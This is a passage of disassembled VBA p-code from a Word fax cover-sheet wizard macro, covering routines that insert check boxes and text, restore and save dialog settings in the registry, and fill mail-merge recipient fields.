' Line #1314:
' 	Ld strText 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #1315:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1316:
' 	ExitSub 
' Line #1317:
' Line #1318:
' 	Label FatalError 
' Line #1319:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1320:
' 	EndSub 
' Line #1321:
' 	QuoteRem 0x0000 0x0039 "Inserts the check-boxes and the text associated with them"
' Line #1322:
' 	FuncDefn (Private Sub InsertCheckBoxes())
' Line #1323:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #1324:
' 	Dim 
' 	VarDefn R1 (As Range)
' Line #1325:
' 	OnError FatalError 
' Line #1326:
' 	Ld strSTY_MSG_HDR_LAST 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #1327:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1328:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set R1 
' Line #1329:
' Line #1330:
' 	SetStmt 
' 	Ld R1 
' 	Ld strAT_UNCHKD_BOX 
' 	Ld objWizTemplate 
' 	ArgsMemLd AutoTextEntries 0x0001 
' 	ArgsMemLd Insert 0x0001 
' 	Set R1 
' Line #1331:
' Line #1332:
' 	Ld R1 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld objActiveRange 
' 	MemSt End 
' Line #1333:
' 	Ld R1 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld objActiveRange 
' 	MemSt Start 
' Line #1334:
' 	Ld strSPACE 
' 	LitDI2 0x0001 
' 	ArgsLd rgstrChkBoxText 0x0001 
' 	Add 
' 	Ld vbTab 
' 	Add 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1335:
' 	Ld wdStyleEmphasis 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #1336:
' Line #1337:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1338:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0005 
' 	For 
' Line #1339:
' 	Ld R1 
' 	MemLd FormattedText 
' 	Ld objActiveRange 
' 	MemSt FormattedText 
' Line #1340:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1341:
' 	Ld strSPACE 
' 	Ld i 
' 	ArgsLd rgstrChkBoxText 0x0001 
' 	Add 
' 	Ld vbTab 
' 	Add 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1342:
' 	Ld wdStyleEmphasis 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #1343:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1344:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #1345:
' Line #1346:
' 	QuoteRem 0x0004 0x002E "delete the previous character i.e the last tab"
' Line #1347:
' 	Ld objActiveRange 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld objActiveRange 
' 	MemSt Start 
' Line #1348:
' 	Ld objActiveRange 
' 	ArgsMemCall Delete 0x0000 
' Line #1349:
' 	Ld objActiveRange 
' 	ArgsMemCall InsertParagraph 0x0000 
' Line #1350:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1351:
' 	ExitSub 
' Line #1352:
' Line #1353:
' 	Label FatalError 
' Line #1354:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1355:
' 	EndSub 
' Line #1356:
' Line #1357:
' 	FuncDefn (Private Sub InsertBodyText())
' Line #1358:
' 	Dim 
' 	VarDefn R1 (As Range)
' Line #1359:
' 	Dim 
' 	VarDefn strAfterText (As String)
' Line #1360:
' 	OnError FatalError 
' Line #1361:
' Line #1362:
' 	Ld iFaxStyle 
' 	Ld iSTY_ELEGANT 
' 	Eq 
' 	IfBlock 
' Line #1363:
' 	Ld vbCr 
' 	St strAfterText 
' Line #1364:
' 	ElseBlock 
' Line #1365:
' 	Ld strSPACE 
' 	Ld strSPACE 
' 	Concat 
' 	St strAfterText 
' Line #1366:
' 	EndIfBlock 
' Line #1367:
' Line #1368:
' Line #1369:
' 	LineCont 0x0004 05 00 08 00
' 	Ld iFaxStyle 
' 	Ld iSTY_PROFESSIONAL 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld strBULLET 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' 	EndIf 
' Line #1370:
' Line #1371:
' 	Ld iFaxStyle 
' 	ArgsLd rgstrNotes 0x0001 
' 	Ld strAfterText 
' 	Concat 
' 	Ld objActiveRange 
' 	ArgsMemCall InsertAfter 0x0001 
' Line #1372:
' Line #1373:
' 	SetStmt 
' 	Ld objActiveRange 
' 	MemLd Duplicate 
' 	Set R1 
' Line #1374:
' 	Ld wdCollapseEnd 
' 	Ld objActiveRange 
' 	ArgsMemCall Collapse 0x0001 
' Line #1375:
' Line #1376:
' 	Ld objActiveRange 
' 	Ld wdFieldMacroButton 
' 	Ld strEMPTY_MACRO 
' 	Ld strCLICK_HERE_COMMENTS 
' 	Concat 
' 	LitVarSpecial (False)
' 	ArgsCall InsertField 0x0004 
' 	QuoteRem 0x0063 0x0012 "PreserveFormatting"
' Line #1377:
' 	Ld wdStyleBodyText 
' 	Ld objActiveRange 
' 	MemSt Style 
' Line #1378:
' 	Ld strSTY_MSG_HDR_LABEL 
' 	Ld R1 
' 	MemSt Style 
' Line #1379:
' Line #1380:
' 	ExitSub 
' Line #1381:
' 	Label FatalError 
' Line #1382:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1383:
' 	EndSub 
' Line #1384:
' 	FuncDefn (Private Sub InsertContAutoText())
' Line #1385:
' Line #1386:
' 	OnError FatalError 
' Line #1387:
' 	SetStmt 
' 	Ld objActiveRange 
' 	LitVarSpecial (True)
' 	Ld strCNTMPGFX2 
' 	Ld objWizTemplate 
' 	ArgsMemLd AutoTextEntries 0x0001 
' 	ArgsMemLd Insert 0x0002 
' 	Set objActiveRange 
' Line #1388:
' Line #1389:
' 	ExitSub 
' Line #1390:
' 	Label FatalError 
' Line #1391:
' 	Ld strERR_AUTOTEXT_NOT_FOUND 
' 	ArgsCall DisplayErrorMsg 0x0001 
' Line #1392:
' 	EndSub 
' Line #1393:
' Line #1394:
' Line #1395:
' 	FuncDefn (Public Sub RestoreDialogValues(fDummy As Boolean))
' Line #1396:
' 	Dim 
' 	VarDefn fAddrBkEnable (As Boolean)
' Line #1397:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #1398:
' 	Dim 
' 	VarDefn strChkdAddr (As String)
' Line #1399:
' Line #1400:
' 	OnError FatalError 
' Line #1401:
' 	Ld strRST_SETTINGS 
' 	St StatusBar 
' Line #1402:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #1403:
' 	Ld wdCursorWait 
' 	Ld System 
' 	MemSt Cursor 
' Line #1404:
' Line #1405:
' 	Ld Application 
' 	MemLd MAPIAvailable 
' 	St fAddrBkEnable 
' Line #1406:
' 	Ld fAddrBkEnable 
' 	Ld formWizard 
' 	MemLd cmdRcpntsAddrBk 
' 	MemSt Enabled 
' Line #1407:
' 	Ld fAddrBkEnable 
' 	Ld formWizard 
' 	MemLd cmdSenderAddrBk 
' 	MemSt Enabled 
' Line #1408:
' Line #1409:
' 	QuoteRem 0x0000 0x0047 "Setting options in Panel1 depending on whether a doc. is present or not"
' Line #1410:
' 	Ld fDocPresent 
' 	IfBlock 
' Line #1411:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optCurDoc 
' 	MemSt Value 
' Line #1412:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optCurDocCovShtYes 
' 	MemSt Value 
' Line #1413:
' 	ElseBlock 
' Line #1414:
' 	QuoteRem 0x0008 0x001A "disable a bunch of options"
' Line #1415:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd optCurDoc 
' 	MemSt Enabled 
' Line #1416:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd cboDocList 
' 	MemSt Enabled 
' Line #1417:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd optCurDocCovShtNo 
' 	MemSt Enabled 
' Line #1418:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd optCurDocCovShtYes 
' 	MemSt Enabled 
' Line #1419:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optCovSht 
' 	MemSt Value 
' Line #1420:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd frmRcpntsFormDoc 
' 	MemSt Visible 
' Line #1421:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd frmRcpntsOrdDoc 
' 	MemSt Visible 
' Line #1422:
' Line #1423:
' 	EndIfBlock 
' Line #1424:
' Line #1425:
' 	QuoteRem 0x0004 0x0006 "Panel2"
' Line #1426:
' 	QuoteRem 0x0004 0x001A "read values from registry."
' Line #1427:
' 	LitStr 0x000A "Fax Option"
' 	LitDI2 0x0000 
' 	ArgsLd IRestorePref 0x0002 
' 	St iFaxOption 
' Line #1428:
' 	Ld System 
' 	MemLd OperatingSystem 
' 	ArgsLd UCase$ 0x0001 
' 	LitStr 0x0002 "NT"
' 	FnInStr 
' 	IfBlock 
' Line #1429:
' 	LitVarSpecial (False)
' 	St fMSFAXEnabled 
' Line #1430:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd optMSFax 
' 	MemSt Enabled 
' Line #1431:
' 	ElseBlock 
' Line #1432:
' 	LitVarSpecial (True)
' 	St fMSFAXEnabled 
' Line #1433:
' 	EndIfBlock 
' Line #1434:
' 	QuoteRem 0x0004 0x0037 "set printer in combo-box before disabling frmFaxDriver."
' Line #1435:
' 	ArgsCall GetAllPrinters 0x0000 
' Line #1436:
' Line #1437:
' 	QuoteRem 0x0004 0x0044 "the controls are assumed to be enabled initially and are explicityly"
' Line #1438:
' 	QuoteRem 0x0004 0x0021 "only turned off, never turned on."
' Line #1439:
' 	Ld iFaxOption 
' 	Ld iMS_FAX 
' 	Eq 
' 	Paren 
' 	Ld fMSFAXEnabled 
' 	Paren 
' 	Not 
' 	And 
' 	IfBlock 
' Line #1440:
' 	Ld iTotalNumPrinters 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #1441:
' 	Ld iDIFF_FAX 
' 	St iFaxOption 
' Line #1442:
' 	ElseBlock 
' Line #1443:
' 	Ld iNO_FAX 
' 	St iFaxOption 
' Line #1444:
' 	EndIfBlock 
' Line #1445:
' 	EndIfBlock 
' Line #1446:
' 	Ld iFaxOption 
' 	SelectCase 
' Line #1447:
' 	Ld iMS_FAX 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #1448:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optMSFax 
' 	MemSt Value 
' Line #1449:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd cboFaxDriver 
' 	MemSt Enabled 
' Line #1450:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd lblFaxDriver 
' 	MemSt Enabled 
' Line #1451:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd cmdOtherPrinters 
' 	MemSt Enabled 
' Line #1452:
' 	Ld iDIFF_FAX 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #1453:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optDifferentFax 
' 	MemSt Value 
' Line #1454:
' 	Ld iNO_FAX 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #1455:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optNoFax 
' 	MemSt Value 
' Line #1456:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd cboFaxDriver 
' 	MemSt Enabled 
' Line #1457:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd lblFaxDriver 
' 	MemSt Enabled 
' Line #1458:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd cmdOtherPrinters 
' 	MemSt Enabled 
' Line #1459:
' 	CaseElse 
' Line #1460:
' 	Ld iNO_FAX 
' 	St iFaxOption 
' Line #1461:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optNoFax 
' 	MemSt Value 
' Line #1462:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd cboFaxDriver 
' 	MemSt Enabled 
' Line #1463:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd lblFaxDriver 
' 	MemSt Enabled 
' Line #1464:
' 	LitVarSpecial (False)
' 	Ld formWizard 
' 	MemLd cmdOtherPrinters 
' 	MemSt Enabled 
' Line #1465:
' Line #1466:
' 	EndSelect 
' Line #1467:
' Line #1468:
' 	QuoteRem 0x0004 0x0006 "Panel3"
' Line #1469:
' 	LitVarSpecial (False)
' 	St fRegistryNamesRead 
' Line #1470:
' Line #1471:
' 	QuoteRem 0x0004 0x0006 "Panel5"
' Line #1472:
' 	Ld Application 
' 	MemLd UserName 
' 	Ld formWizard 
' 	MemLd txtSenderName 
' 	MemSt Then 
' Line #1473:
' Line #1474:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld strChkdAddr 
' 	Ld iMAX_ADDR_LINES 
' 	ArgsLd ICountLines 0x0003 
' 	St i 
' Line #1475:
' 	Ld strChkdAddr 
' 	Ld formWizard 
' 	MemLd txtMailingAddr 
' 	MemSt Then 
' Line #1476:
' 	LitStr 0x000A "Sender Fax"
' 	LitStr 0x0000 ""
' 	ArgsLd StrRestorePref 0x0002 
' 	Ld formWizard 
' 	MemLd txtSenderFax 
' 	MemSt Then 
' Line #1477:
' 	LitStr 0x000C "Sender Phone"
' 	LitStr 0x0000 ""
' 	ArgsLd StrRestorePref 0x0002 
' 	Ld formWizard 
' 	MemLd txtSenderPhone 
' 	MemSt Then 
' Line #1478:
' Line #1479:
' 	QuoteRem 0x0004 0x0007 "Panel 4"
' Line #1480:
' 	LitStr 0x0010 "Coversheet Style"
' 	LitDI2 0x0000 
' 	ArgsLd IRestorePref 0x0002 
' 	St iFaxStyle 
' Line #1481:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld iFaxStyle 
' 	Ld iSTY_PROFESSIONAL 
' 	Lt 
' 	Paren 
' 	Ld iFaxStyle 
' 	Ld iSTY_ELEGANT 
' 	Gt 
' 	Paren 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld iSTY_PROFESSIONAL 
' 	St iFaxStyle 
' 	EndIf 
' Line #1482:
' 	Ld iFaxStyle 
' 	SelectCase 
' Line #1483:
' 	Ld iSTY_PROFESSIONAL 
' 	Case 
' 	CaseDone 
' Line #1484:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optStyleProf 
' 	MemSt Value 
' Line #1485:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd lblStyle0 
' 	MemSt Visible 
' Line #1486:
' 	Ld iSTY_CONTEMPORARY 
' 	Case 
' 	CaseDone 
' Line #1487:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optStyleCont 
' 	MemSt Value 
' Line #1488:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd lblStyle1 
' 	MemSt Visible 
' Line #1489:
' 	Ld iSTY_ELEGANT 
' 	Case 
' 	CaseDone 
' Line #1490:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd optStyleEleg 
' 	MemSt Value 
' Line #1491:
' 	LitVarSpecial (True)
' 	Ld formWizard 
' 	MemLd lblStyle2 
' 	MemSt Visible 
' Line #1492:
' 	EndSelect 
' Line #1493:
' Line #1494:
' 	OnError <crash> 
' 	QuoteRem 0x0015 0x0010 "reset error trap"
' Line #1495:
' 	OnError (Resume Next) 
' Line #1496:
' 	LitStr 0x0000 ""
' 	Ld strREGKEY_CMPNY_NAME 
' 	Ld strVALKEY_CMPNY_NAME 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld formWizard 
' 	MemLd txtCompany 
' 	MemSt Then 
' Line #1497:
' 	LitVarSpecial (True)
' 	St fSettingsRestored 
' Line #1498:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #1499:
' 	LitStr 0x0000 ""
' 	St StatusBar 
' Line #1500:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #1501:
' Line #1502:
' 	ExitSub 
' Line #1503:
' Line #1504:
' 	Label FatalError 
' Line #1505:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1506:
' 	EndSub 
' Line #1507:
' Line #1508:
' 	QuoteRem 0x0000 0x0019 "sets default merge fields"
' Line #1509:
' 	FuncDefn (Public Sub FillMergeFields(fDummy As Boolean))
' Line #1510:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn iCount (As Integer)
' Line #1511:
' 	Dim 
' 	VarDefn iFirstName (As Integer)
' Line #1512:
' 	Dim 
' 	VarDefn iLastName (As Integer)
' Line #1513:
' 	Dim 
' 	VarDefn iFax (As Integer)
' Line #1514:
' 	Dim 
' 	VarDefn rgstrNames (As String)
' Line #1515:
' 	Dim 
' 	VarDefn objFieldNames (As MailMergeFieldNames)
' Line #1516:
' 	Dim 
' 	VarDefn objTempDoc (As Document)
' Line #1517:
' Line #1518:
' 	OnError FatalError 
' Line #1519:
' 	LitDI2 0x0001 
' 	UMi 
' 	St iFirstName 
' Line #1520:
' 	LitDI2 0x0001 
' 	UMi 
' 	St iLastName 
' Line #1521:
' 	LitDI2 0x0001 
' 	UMi 
' 	St iFax 
' Line #1522:
' Line #1523:
' 	QuoteRem 0x0004 0x0046 "reset the query options so that all names in the data src are selected"
' Line #1524:
' Line #1525:
' 	SetStmt 
' 	Ld objDataSrc 
' 	MemLd FieldNames 
' 	Set objFieldNames 
' Line #1526:
' 	Ld objFieldNames 
' 	MemLd Count 
' 	St iCount 
' Line #1527:
' 	OptionBase 
' 	Ld iCount 
' 	LitDI2 0x0001 
' 	Sub 
' 	Redim rgstrNames 0x0001 (As Variant)
' Line #1528:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iCount 
' 	For 
' Line #1529:
' 	Ld i 
' 	ArgsLd objFieldNames 0x0001 
' 	MemLd New 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsSt rgstrNames 0x0001 
' Line #1530:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd rgstrNames 0x0001 
' 	Ld strFLD_NAME 
' 	FnInStr 
' 	IfBlock 
' Line #1531:
' 	Ld iFirstName 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #1532:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St iFirstName 
' Line #1533:
' 	Ld iLastName 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	ElseIfBlock 
' Line #1534:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St iLastName 
' Line #1535:
' 	EndIfBlock 
' Line #1536:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd rgstrNames 0x0001 
' 	Ld strFLD_FAX 
' 	FnInStr 
' 	ElseIfBlock 
' Line #1537:
' 	Ld iFax 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St iFax 
' 	EndIf 
' Line #1538:
' 	EndIfBlock 
' Line #1539:
' Line #1540:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #1541:
' Line #1542:
' 	Ld rgstrNames 
' 	Ld formWizard 
' 	MemLd cboFldsRcpntFirstName 
' 	MemSt List 
' Line #1543:
' 	Ld rgstrNames 
' 	Ld formWizard 
' 	MemLd cboFldsRcpntLastName 
' 	MemSt List 
' Line #1544:
' 	Ld rgstrNames 
' 	Ld formWizard 
' 	MemLd cboFldsFaxNum 
' 	MemSt List 
' Line #1545:
' Line #1546:
' 	Ld strNONE 
' 	Ld formWizard 
' 	MemLd cboFldsRcpntFirstName 
' 	ArgsMemCall AddItem 0x0001 
' Line #1547:
' 	Ld strNONE 
' 	Ld formWizard 
' 	MemLd cboFldsRcpntLastName 
' 	ArgsMemCall AddItem 0x0001 
' Line #1548:
' Line #1549:
' 	Ld iFirstName 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #1550:
' 	Ld iFirstName 
' 	ArgsLd rgstrNames 0x0001 
' 	Ld formWizard 
' 	MemLd cboFldsRcpntFirstName 
' 	MemSt Value 
' Line #1551:
' 	ElseBlock 
' Line #1552:
' 	Ld strNONE 
' 	Ld formWizard 
' 	MemLd cboFldsRcpntFirstName 
' 	MemSt Value 
' Line #1553:
' 	EndIfBlock 
' Line #1554:
' Line #1555:
' 	Ld iLastName 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #1556:
' 	Ld iLastName 
' 	ArgsLd rgstrNames 0x0001 
' 	Ld formWizard 
' 	MemLd cboFldsRcpntLastName 
' 	MemSt Value 
' Line #1557:
' 	ElseBlock 
' Line #1558:
' 	Ld strNONE 
' 	Ld formWizard 
' 	MemLd cboFldsRcpntLastName 
' 	MemSt Value 
' Line #1559:
' 	EndIfBlock 
' Line #1560:
' Line #1561:
' 	LineCont 0x0004 08 00 08 00
' 	Ld iFax 
' 	LitDI2 0x0001 
' 	UMi 
' 	Ne 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld iFax 
' 	ArgsLd rgstrNames 0x0001 
' 	Ld formWizard 
' 	MemLd cboFldsFaxNum 
' 	MemSt Value 
' 	EndIf 
' Line #1562:
' Line #1563:
' 	ExitSub 
' Line #1564:
' Line #1565:
' 	Label FatalError 
' Line #1566:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1567:
' 	EndSub 
' Line #1568:
' Line #1569:
' 	QuoteRem 0x0000 0x0033 "retrieves the Names and numbers stored in registry."
' Line #1570:
' 	FuncDefn (Sub ReadRegistryFaxNames(fDummy As Boolean))
' Line #1571:
' 	Dim 
' 	VarDefn j (As Integer)
' 	VarDefn k (As Integer)
' Line #1572:
' 	Dim 
' 	VarDefn objCtrls (As Object)
' Line #1573:
' 	OnError FatalError 
' Line #1574:
' 	LitVarSpecial (True)
' 	St fRegistryNamesRead 
' Line #1575:
' 	SetStmt 
' 	Ld iPANEL_RCPNTS 
' 	Ld formWizard 
' 	MemLd mpgWizardPage 
' 	ArgsMemLd Pages 0x0001 
' 	MemLd Controls 
' 	Set objCtrls 
' Line #1576:
' Line #1577:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMAX_RCPNTS 
' 	For 
' Line #1578:
' 	Ld strRCPNT_NAME 
' 	Ld j 
' 	Concat 
' 	LitStr 0x0000 ""
' 	ArgsLd StrRestorePref 0x0002 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsSt rgstrMRUFaxNames 0x0001 
' Line #1579:
' 	Ld strRCPNT_NUMBER 
' 	Ld j 
' 	Concat 
' 	LitStr 0x0000 ""
' 	ArgsLd StrRestorePref 0x0002 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsSt rgstrMRUFaxNums 0x0001 
' Line #1580:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #1581:
' Line #1582:
' Line #1583:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld iMAX_RCPNTS 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #1584:
' 	Ld rgstrMRUFaxNames 
' 	Ld strCBO_RCPNT_NAME 
' 	Ld j 
' 	Concat 
' 	ArgsLd objCtrls 0x0001 
' 	MemSt List 
' Line #1585:
' 	Ld rgstrMRUFaxNums 
' 	Ld strCBO_RCPNT_NUM 
' 	Ld j 
' 	Concat 
' 	ArgsLd objCtrls 0x0001 
' 	MemSt List 
' Line #1586:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #1587:
' Line #1588:
' 	ExitSub 
' Line #1589:
' Line #1590:
' 	Label FatalError 
' Line #1591:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1592:
' 	EndSub 
' Line #1593:
' 	FuncDefn (Sub SaveDialogValues(fDummy As Boolean))
' Line #1594:
' 	OnError FatalError 
' Line #1595:
' Line #1596:
' 	Ld strSAVE_SETTINGS 
' 	St StatusBar 
' Line #1597:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #1598:
' 	Ld wdCursorWait 
' 	Ld System 
' 	MemSt Cursor 
' Line #1599:
' Line #1600:
' 	Ld Now 
' 	LitStr 0x000C "General Date"
' 	ArgsLd Format$$ 0x0002 
' 	LitStr 0x0000 ""
' 	Ld strREG_SETTINGS_BASE_KEY 
' 	Ld strREG_ASSISTANT_TIME_STAMP 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #1601:
' 	Ld strREG_ASSISTANT_HELP 
' 	Ld iLocalState 
' 	ArgsCall StoreValPref 0x0002 
' Line #1602:
' Line #1603:
' 	LitStr 0x000A "Fax Option"
' 	Ld iFaxOption 
' 	Coerce (Str) 
' 	ArgsCall StorePref 0x0002 
' Line #1604:
' 	LineCont 0x0004 05 00 08 00
' 	Ld iFaxOption 
' 	Ld iDIFF_FAX 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "Fax Driver"
' 	Ld formWizard 
' 	MemLd cboFaxDriver 
' 	MemLd Then 
' 	ArgsCall StorePref 0x0002 
' 	EndIf 
' Line #1605:
' Line #1606:
' 	LitStr 0x000A "Sender Fax"
' 	Ld formWizard 
' 	MemLd txtSenderFax 
' 	MemLd Then 
' 	ArgsCall StorePref 0x0002 
' Line #1607:
' 	LitStr 0x000C "Sender Phone"
' 	Ld formWizard 
' 	MemLd txtSenderPhone 
' 	MemLd Then 
' 	ArgsCall StorePref 0x0002 
' Line #1608:
' 	LitStr 0x0010 "Coversheet Style"
' 	Ld iFaxStyle 
' 	Coerce (Str) 
' 	ArgsCall StorePref 0x0002 
' Line #1609:
' Line #1610:
' 	Ld fDocIsFormLtr 
' 	Paren 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	ArgsCall SaveRcpntsInRegistry 0x0000 
' 	EndIf 
' Line #1611:
' Line #1612:
' 	LitVarSpecial (True)
' 	St fSettingsSaved 
' Line #1613:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #1614:
' 	LitStr 0x0000 ""
' 	St StatusBar 
' Line #1615:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #1616:
' Line #1617:
' 	ExitSub 
' Line #1618:
' Line #1619:
' 	Label FatalError 
' Line #1620:
' 	Ld Err 
' 	ArgsCall ReportError 0x0001 
' Line #1621:
' 	EndSub 
' Line #1622:
' Line #1623:
' 	QuoteRem 0x0000 0x0041 "stores the recipient names and numbers of iMAX_RCPNTS recipients."
' Line #1624:
' 	QuoteRem 0x0000 0x004A "The name is tagged to the number. So, you can have a number without a name"
' Line #1625:
' 	QuoteRem 0x0000 0x001F "but not a name without a number"
' Line #1626:
' 	FuncDefn (Private Sub SaveRcpntsInRegistry())
' Line #1627:
' 	QuoteRem 0x0000 0x0015 "Dim strName As String"
' Line #1628:
' 	Dim 
' 	VarDefn strNum (As String)
' Line #1629:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn j (As Integer)
' 	VarDefn k (As Integer)
' Line #1630:
' 	Dim 
' 	VarDefn objCtrls (As Object)
' Line #1631:
' Line #1632:
' 	OnError FatalError 
' Line #1633:
' 	LitDI2 0x0000 
' 	St k 
' Line #1634:
' 	QuoteRem 0x0004 0x0036 "initialize the arrays so that even if the user has not"
' Line #1635:
' 	QuoteRem 0x0004 0x0044 "chosen any recipient we can still use the first entry of the arrays."
' Line #1636:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	ArgsSt rgstrRcpntFaxNames 0x0001 
' Line #1637:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0000 
' 	ArgsSt rgstrRcpntFaxNums 0x0001 
' Line #1638:
' 	LitDI2 0x0000 
' 	St iNumRcpnts 
' Line #1639:
' Line #1640:
' 	SetStmt 
' 	Ld iPANEL_RCPNTS 
' 	Ld formWizard 
' 	MemLd mpgWizardPage 
' 	ArgsMemLd Pages 0x0001 
' 	MemLd Controls 
' 	Set objCtrls 
' Line #1641:
' Line #1642:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld iMAX_RCPNTS 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #1643:
' 	Ld strCBO_RCPNT_NUM 
' 	Ld i 
' 	Concat 
' 	ArgsLd objCtrls 0x0001 
' 	MemLd Then 
' 	Ld vbTab 
